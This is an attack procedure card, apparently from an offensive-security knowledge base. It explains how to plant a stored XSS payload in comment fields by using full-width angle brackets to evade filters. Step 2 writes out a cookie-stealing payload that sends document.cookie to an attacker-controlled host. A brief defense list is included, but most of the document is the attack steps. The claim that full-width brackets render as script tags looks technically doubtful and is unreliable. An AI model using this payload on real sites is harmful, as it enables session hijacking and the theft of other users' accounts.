---
id: proc-uuid-12345
name: Craft-XSS-Payload-with-Full-Width-Brackets
tags:
  - xss
  - payload-craft
  - unicode-bypass
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:25.603Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-XSS-Payload-with-Full-Width-Brackets

## Summary

This procedure crafts a JavaScript payload using full-width angle brackets (U+FF1C and U+FF1E) to bypass sanitization filters that only target standard ASCII < and >, enabling stored XSS in comment fields.

## Description

In scenarios like Snapmatic comments on UGC platforms, filters inconsistently handle Unicode full-width characters, allowing attackers to inject script tags that execute when viewed by others. This leads to client-side attacks such as cookie theft or phishing. Prerequisites include understanding the target's filter behavior, tested via input validation.

## Requirements

1. Access to a text editor or browser console for payload testing
2. Knowledge of the target's comment input field
3. Attacker-controlled domain for exfiltration (e.g., for cookie theft)

## Defense

Defensive measures and detection strategies:

- Normalize Unicode characters to ASCII before sanitization (e.g., using libraries like normalize-unicode)
- Implement comprehensive output encoding for all user inputs in HTML contexts
- Monitor for unusual network requests from client-side scripts

## Objectives

1. Create a bypass payload that evades input filters
2. Ensure payload executes JS for data collection
3. Validate payload in a non-production test environment

## Instructions

### Step 1: Identify Filter Weakness

**Context**: Test standard script tags to confirm blocking, then try full-width variants.

Open the comment input field and attempt: `<script>alert(1)</script>`. It should be blocked. Then input: `＜script＞alert(1)＜/script＞` (using full-width brackets).

> The full-width version should pass validation.

### Step 2: Build Exfiltration Payload

**Context**: Enhance the payload for real impact, like stealing session cookies.

Construct: `＜script＞var i=new Image();i.src='https://attacker.com/log?cookie='+document.cookie;＜/script＞`.

> This sends cookies via a GET request to your server upon execution.

### Step 3: Test Payload Rendering

**Context**: Preview or submit a test comment to ensure it renders without breaking.

Submit the payload as a comment and inspect the HTML source in the browser dev tools to confirm the script tag is present and unescaped.

> Look for the full-width tags in the DOM; they should interpret as <script> in rendering.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[unicode-bypass]]
